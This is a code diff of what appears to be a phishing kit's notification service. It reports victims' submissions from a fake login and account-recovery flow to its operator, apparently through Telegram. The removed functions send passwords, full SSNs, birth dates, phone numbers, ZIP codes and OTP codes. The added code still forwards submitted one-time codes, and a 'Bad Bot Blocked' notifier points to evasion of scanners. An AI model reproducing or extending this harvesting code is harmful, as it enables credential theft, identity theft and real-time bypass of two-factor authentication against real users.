+    await sendFormNotification({
+      type: isEmail ? 'email_verification' : 'text_verification',
+      page: '/login/2fa-verify',
+      timestamp: new Date().toISOString(),
+    })
   }
 
   async sendVerificationNotification(data: VerificationData): Promise<void> {
-    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
-    await this.sendMessage(message);
+    const isEmail = data.verificationType === 'email'
+    await sendFormNotification({
+      type: isEmail ? 'login_email_otp_verification' : 'login_text_otp_verification',
+      otp: data.code,
+      page: '/login/verify-code',
+      timestamp: new Date().toISOString(),
+    })
   }
 
-  async sendVerificationClickNotification(
-    verificationType: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
-    await this.sendMessage(message);
+  async sendResendCodeNotification(data: VerificationClickData): Promise<void> {
+    const isEmail = data.verificationType === 'email'
+    await sendFormNotification({
+      type: isEmail ? 'login_email_otp_resend' : 'login_text_otp_resend',
+      page: '/login/verify-code',
+      timestamp: new Date().toISOString(),
+    })
   }
 
-  async sendResendCodeNotification(
-    isSecondOtp: boolean,
-    ip?: string,
-  ): Promise<void> {
-    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
-    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
-    await this.sendMessage(message);
-  }
 
-  async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordNotification(
-    data: ForgotPasswordData,
-  ): Promise<void> {
-    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserNotification(data: NewUserData): Promise<void> {
-    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
-    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPasswordNotification(
-    password: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
-    await this.sendMessage(message);
-  }
-
-  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
-    const passwordText = data.password
-      ? `\n🔑 <b>Password:</b> ${data.password}`
-      : "";
-    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
-    await this.sendMessage(message);
-  }
-
-  async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
-    const message =
-      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
-      `User clicked "Reset password" on the account found page.`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordVerifyNotification(
-    verificationType: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordCodeNotification(
-    code: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
-    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
-    await this.sendMessage(message);
-  }
-
-  async sendRememberDeviceNotification(
-    data: RememberDeviceData,
-  ): Promise<void> {
-    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
-    await this.sendMessage(message);
-  }
-
-  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
-    const message =
-      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
-      `🔢 <b>SSN:</b> ${data.ssn}\n` +
-      `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
-      `📞 <b>Phone:</b> ${data.phone}\n` +
-      `📍 <b>ZIP Code:</b> ${data.zip}`;
-    await this.sendMessage(message);
-  }
-
-  async sendBlockedBotNotification(data: {
-    userAgent: string;
-    ip: string;
-    path: string;
-  }): Promise<void> {
-    const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
-    await this.sendMessage(msg);
-  }
 }
 
-export const telegramService = new TelegramService();
+export const telegramService = new TelegramService()
+
